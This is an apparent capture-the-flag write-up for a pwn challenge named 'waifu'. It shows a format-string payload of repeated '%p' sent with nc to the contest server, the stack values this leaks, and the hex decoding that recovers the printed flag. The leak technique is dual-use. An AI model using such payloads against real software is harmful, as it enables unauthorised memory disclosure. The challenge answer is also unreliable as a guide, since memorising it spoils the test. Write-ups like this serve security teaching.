# waifu
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/solves-111-orange)

## Description
Honestly I just needed a name, I am almost out of time :skull:.

Connect with `nc litctf.live 31791`

[waifu.zip](https://drive.google.com/uc?export=download&id=1SVW7rWSdpu3cPYDyATw5a9pJJMH0umTS)

## Solution
Looking at the source code, there is a format string exploit. Our input is passed directly to `printf`, which can leak the flag. Because alloca creates space on the stack, we can use `%p` to leak information off the stack.
```
$ nc litctf.live 31791
Do you like waifus?
%p%p%p%p%p%p%p%p%p%p

Wtmoo how could you say:
0x7fb568199723(nil)0x7fb5680ba0770x190x7c0x667b46544354494c0x747833745f6d30720x755f68732e3772340x61616161616161770x7d61616161616161
```

Cleaning the data a bit by removing the (nil) and `0x`, as well as padding all the tokens to be 16 characters, we can use CyberChef to get the flag.

![](https://cdn.discordapp.com/attachments/359503958601105418/1003410720148435125/unknown.png)

Flag: `LITCTF{fr0m_t3xt4r7.sh_uwaaaaaaaaaaaaaa}`
